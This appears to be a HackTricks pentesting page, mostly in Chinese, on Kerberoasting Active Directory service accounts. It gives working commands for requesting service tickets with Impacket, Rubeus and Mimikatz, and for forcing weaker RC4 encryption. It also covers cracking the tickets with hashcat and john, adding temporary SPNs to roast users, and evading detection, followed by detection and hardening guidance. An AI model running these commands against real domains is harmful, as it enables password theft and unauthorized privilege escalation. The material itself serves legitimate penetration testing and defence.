# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting 专注于获取 TGS 票证，尤其是那些与在 Active Directory (AD) 下以用户账户运行的服务相关的票证（不包括计算机账户）。这些票证的加密使用源自用户密码的密钥，从而允许离线破解凭证。将用户账户用作服务由非空的 ServicePrincipalName (SPN) 属性指示。

任何经过身份验证的域用户都可以请求 TGS 票证，因此不需要特殊权限。

### 关键点

- 针对以用户账户运行的服务的 TGS 票证（即设置了 SPN 的账户；不是计算机账户）。
- 票证使用从服务账户密码派生的密钥加密，能够离线破解。
- 不需要提升权限；任何经过身份验证的账户都可以请求 TGS 票证。

> [!WARNING]
> 大多数公共工具偏好请求 RC4-HMAC (etype 23) 的服务票证，因为它们比 AES 更快被破解。RC4 TGS 哈希以 `$krb5tgs$23$*` 开头，AES128 以 `$krb5tgs$17$*`，AES256 以 `$krb5tgs$18$*`。然而，许多环境正在转向仅使用 AES。不要假定只有 RC4 是相关的。
> 另外，避免“spray-and-pray” roasting。Rubeus’ 默认 kerberoast 可以查询并请求所有 SPN 的票证，噪声很大。先枚举并针对有趣的 principal。

### 服务账户秘密与 Kerberos 加密成本

许多服务仍以手动管理密码的用户账户运行。KDC 使用来自这些密码的密钥对服务票证进行加密，并将密文提供给任何经过身份验证的主体，因此 kerberoasting 提供了无限的离线猜测机会而不会触发锁定或 DC 遥测。加密模式决定了破解预算：

| 模式 | 密钥派生 | 加密类型 | 约 RTX 5090 吞吐量* | 说明 |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1，4,096 次迭代，并使用由域 + SPN 生成的每个主体的 salt | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 million guesses/s | Salt 阻止彩虹表，但仍允许快速破解短密码。 |
| RC4 + NT hash | 密码的单次 MD4（无盐的 NT hash）；Kerberos 仅在每个票证中混入一个 8 字节的 confounder | etype 23 (`$krb5tgs$23$`) | ~4.18 **billion** guesses/s | 比 AES 快约 1000×；当 `msDS-SupportedEncryptionTypes` 允许时，攻击者会强制使用 RC4。 |

*基准来自 Chick3nman，如 [Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/) 中所述。

RC4 的 confounder 仅随机化密钥流；它不会为每次猜测增加工作量。除非服务账户依赖随机秘密（gMSA/dMSA、机器账户或由 vault 管理的字符串），否则妥协速度纯粹由 GPU 预算决定。强制仅使用 AES 的 etype 可以消除每秒数十亿次猜测的降级优势，但弱的人类密码仍会被 PBKDF2 破解。

### Attack

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
包含 kerberoast 检查的多功能工具：
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- 枚举 kerberoastable 用户
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- 方法 1：请求 TGS 并从内存中转储
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- 方法 2：自动化工具
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> TGS 请求会生成 Windows 安全事件 4769（请求了 Kerberos 服务票证）。

### OPSEC 和 AES-only 环境

- 有意对没有 AES 的账号请求 RC4：
- Rubeus: `/rc4opsec` 使用 tgtdeleg 来枚举没有 AES 的账号并请求 RC4 服务票证。
- Rubeus: `/tgtdeleg` 与 kerberoast 一起也会在可能的情况下触发 RC4 请求。
- 对 AES-only 账号进行 roast 而不是静默失败：
- Rubeus: `/aes` 枚举启用 AES 的账号并请求 AES 服务票证（etype 17/18）。
- 如果你已经持有 TGT（PTT 或来自 .kirbi），可以使用 `/ticket:<blob|path>` 配合 `/spn:<SPN>` 或 `/spns:<file>` 并跳过 LDAP。
- 定位、限速与减少噪音：
- 使用 `/user:<sam>`、`/spn:<spn>`、`/resultlimit:<N>`、`/delay:<ms>` 和 `/jitter:<1-100>`。
- 使用 `/pwdsetbefore:<MM-dd-yyyy>`（较旧的密码）筛选可能的弱密码，或使用 `/ou:<DN>` 定位特权 OU。

Examples (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Cracking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### 持久化 / 滥用

如果你控制或可以修改某个账户，你可以通过添加一个 SPN 将其设为 kerberoastable：
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
将账户降级以启用 RC4 以便更容易破解（需要对目标对象的写权限）：
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### 通过 GenericWrite/GenericAll 针对用户的定向 Kerberoast（临时 SPN）

当 BloodHound 显示你对某个用户对象具有控制权（例如 GenericWrite/GenericAll）时，即使该用户当前没有任何 SPNs，你也可以可靠地 “targeted-roast” 该用户：

- 为被控制的用户添加临时 SPN，使其可以被 Kerberoast。
- 为该 SPN 请求一个使用 RC4（etype 23）加密的 TGS-REP，以便更容易被破解。
- 使用 hashcat 破解 `$krb5tgs$23$...` 哈希。
- 清理该 SPN 以减少痕迹。

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Linux 一行命令 (targetedKerberoast.py 自动化添加 SPN -> 请求 TGS (etype 23) -> 移除 SPN):
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
使用 hashcat autodetect（mode 13100 对于 `$krb5tgs$23$`）破解输出：
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
Detection notes: 添加/删除 SPNs 会引起目录更改（目标用户上会生成 Event ID 5136/4738），而 TGS 请求会产生 Event ID 4769。考虑实施 throttling 并及时清理。

You can find useful tools for kerberoast attacks here: https://github.com/nidem/kerberoast

If you find this error from Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` it’s due to local time skew. Sync to the DC:

- `ntpdate <DC_IP>` (deprecated on some distros)
- `rdate -n <DC_IP>`

### Kerberoast without a domain account (AS-requested STs)

In September 2022, Charlie Clark showed that if a principal does not require pre-authentication, it’s possible to obtain a service ticket via a crafted KRB_AS_REQ by altering the sname in the request body, effectively getting a service ticket instead of a TGT. This mirrors AS-REP roasting and does not require valid domain credentials.

See details: Semperis write-up “New Attack Paths: AS-requested STs”.

> [!WARNING]
> 你必须提供用户列表，因为在没有有效凭据的情况下无法使用此技术查询 LDAP。

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
Related

If you are targeting AS-REP roastable users, see also:

{{#ref}}
asreproast.md
{{#endref}}

### 检测

Kerberoasting 可能很隐蔽。从 DC 上查找 Event ID 4769，并应用过滤以减少噪音：

- 排除服务名 `krbtgt` 和以 `$` 结尾的服务名（计算机帐户）。
- 排除来自计算机帐户的请求（`*$$@*`）。
- 仅成功的请求（Failure Code `0x0`）。
- 跟踪加密类型：RC4 (`0x17`)、AES128 (`0x11`)、AES256 (`0x12`)。不要仅在 `0x17` 上触发告警。

示例 PowerShell 初步排查：
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
附加建议：

- 对每个主机/用户建立正常 SPN 使用基线；当单一主体出现大量不同 SPN 请求的突增时发出警报。
- 在启用 AES 的域中标记异常的 RC4 使用情况。

### 缓解 / 加固

- 对服务使用 gMSA/dMSA 或计算机账户。托管账户具有 120+ 字符的随机密码并自动轮换，使离线破解变得不切实际。
- 通过将 `msDS-SupportedEncryptionTypes` 设置为仅 AES（十进制 24 / 十六进制 0x18）并随后轮换密码来强制对服务账户使用 AES，以便派生 AES 密钥。
- 在可能的情况下在环境中禁用 RC4 并监控 RC4 使用尝试。在 DCs 上，可以使用 `DefaultDomainSupportedEncTypes` 注册表值来控制未设置 `msDS-SupportedEncryptionTypes` 的账户的默认加密类型。进行充分测试。
- 从用户账户中移除不必要的 SPN。
- 如果无法使用托管账户，则为服务账户使用长且随机的密码（25+ 字符）；禁止常见密码并定期审计。

## 参考资料

- [https://github.com/ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [Matthew Green – Kerberoasting: Low-Tech, High-Impact Attacks from Legacy Kerberos Crypto (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [Microsoft Security Blog (2024-10-11) – Microsoft’s guidance to help mitigate Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [SpecterOps – Rubeus Roasting documentation](https://docs.specterops.io/ghostpack/rubeus/roasting)
- [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)

{{#include ../../banners/hacktricks-training.md}}
